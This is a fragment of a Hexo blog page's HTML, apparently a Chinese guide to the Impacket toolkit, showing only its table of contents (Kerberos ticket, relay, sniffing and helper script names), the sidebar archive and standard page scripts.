href="#ntfs-read-py"><span class="toc-number">1.5.5.</span> <span class="toc-text">ntfs-read.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#esentutl-py"><span class="toc-number">1.5.6.</span> <span class="toc-text">esentutl.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#attrib-py"><span class="toc-number">1.5.7.</span> <span class="toc-text">attrib.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#changepasswd-py"><span class="toc-number">1.5.8.</span> <span class="toc-text">changepasswd.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#addcomputer-py"><span class="toc-number">1.5.9.</span> <span class="toc-text">addcomputer.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dacledit-py"><span class="toc-number">1.5.10.</span> <span class="toc-text">dacledit.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#owneredit-py"><span class="toc-number">1.5.11.</span> <span class="toc-text">owneredit.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos-%E7%A5%A8%E6%8D%AE%E5%B7%A5%E5%85%B7"><span class="toc-number">1.6.</span> <span class="toc-text">Kerberos 票据工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#getTGT-py"><span class="toc-number">1.6.1.</span> <span class="toc-text">getTGT.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getST-py"><span class="toc-number">1.6.2.</span> <span class="toc-text">getST.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ticketer-py"><span class="toc-number">1.6.3.</span> <span class="toc-text">ticketer.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#goldenPac-py"><span class="toc-number">1.6.4.</span> <span class="toc-text">goldenPac.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ticketConverter-py"><span class="toc-number">1.6.5.</span> <span class="toc-text">ticketConverter.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#describeTicket-py"><span class="toc-number">1.6.6.</span> <span class="toc-text">describeTicket.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getPac-py"><span class="toc-number">1.6.7.</span> <span class="toc-text">getPac.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kintercept-py"><span class="toc-number">1.6.8.</span> <span class="toc-text">kintercept.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E5%B7%A5%E5%85%B7"><span class="toc-number">1.7.</span> <span class="toc-text">网络攻击工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ntlmrelayx-py"><span class="toc-number">1.7.1.</span> <span class="toc-text">ntlmrelayx.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#karmaSMB-py"><span class="toc-number">1.7.2.</span> <span class="toc-text">karmaSMB.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#keylistattack-py"><span class="toc-number">1.7.3.</span> <span class="toc-text">keylistattack.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#badsuccessor-py"><span class="toc-number">1.7.4.</span> <span class="toc-text">badsuccessor.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rbcd-py"><span class="toc-number">1.7.5.</span> <span class="toc-text">rbcd.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7"><span class="toc-number">1.8.</span> <span class="toc-text">系统分析工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dpapi-py"><span class="toc-number">1.8.1.</span> <span class="toc-text">dpapi.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getArch-py"><span class="toc-number">1.8.2.</span> <span class="toc-text">getArch.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#filetime-py"><span class="toc-number">1.8.3.</span> <span class="toc-text">filetime.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mqtt-check-py"><span class="toc-number">1.8.4.</span> <span class="toc-text">mqtt_check.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exchanger-py"><span class="toc-number">1.8.5.</span> <span class="toc-text">exchanger.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sambaPipe-py"><span class="toc-number">1.8.6.</span> <span class="toc-text">sambaPipe.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%91%E6%8E%A7%E5%92%8C%E5%97%85%E6%8E%A2%E5%B7%A5%E5%85%B7"><span class="toc-number">1.9.</span> <span class="toc-text">监控和嗅探工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sniff-py"><span class="toc-number">1.9.1.</span> <span class="toc-text">sniff.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sniffer-py"><span class="toc-number">1.9.2.</span> <span class="toc-text">sniffer.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ping-py"><span class="toc-number">1.9.3.</span> <span class="toc-text">ping.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ping6-py"><span class="toc-number">1.9.4.</span> <span class="toc-text">ping6.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7"><span class="toc-number">1.10.</span> <span class="toc-text">辅助工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#split-py"><span class="toc-number">1.10.1.</span> <span class="toc-text">split.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tstool-py"><span class="toc-number">1.10.2.</span> <span class="toc-text">tstool.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wmipersist-py"><span class="toc-number">1.10.3.</span> <span class="toc-text">wmipersist.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wmiquery-py"><span class="toc-number">1.10.4.</span> <span class="toc-text">wmiquery.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#raiseChild-py"><span class="toc-number">1.10.5.</span> <span class="toc-text">raiseChild.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">1.11.</span> <span class="toc-text">使用注意事项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5"><span class="toc-number">1.12.</span> <span class="toc-text">常见问题排查</span></a></li></ol></li></ol>
+            </div>
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+        
+        
+        
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 3
+        </div>
+        <!-- search  -->
+    </div>
+    <div class="post-archive">
+            <div class="archive-year"> 2026 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/08</span>
+            <a class="archive-post-title" href="/2026/04/08/bloodyAD%E4%B8%AD%E6%96%87%E6%8C%87%E5%8D%97/">bloodyAD 中文指南</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/08</span>
+            <a class="archive-post-title" href="/2026/04/08/impacket0.13wiki%E6%8C%87%E5%8D%97/">Impacket wiki中文指南</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/07</span>
+            <a class="archive-post-title" href="/2026/04/07/Certipy%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3/">Certipy 中文文档</a>
+        </li>
+            </ul>
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+            <span class="sidebar-tag-name" data-tags="工具wiki">
+                <span class="iconfont-archer">&#xe606;</span>
+                工具wiki
+            </span>
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+        <span class="sidebar-category-name" data-categories="工具wiki">
+            <span class="iconfont-archer">&#xe60a;</span>
+            工具wiki
+        </span>
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "https://wenfenhui.github.io",
+        root: siteMetaRoot,
+        author: "wenfenhui"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+        <!-- main func -->
+        <script src="/scripts/main.js"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js" onload="window.Fancybox.bind('[data-fancybox]')" defer></script>
+        <!-- algolia -->
+        <!-- busuanzi -->
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        <!-- async load share.js -->
+            <script src="/scripts/share.js" async></script>
+        <!-- mermaid -->
+    </body>
+</html>
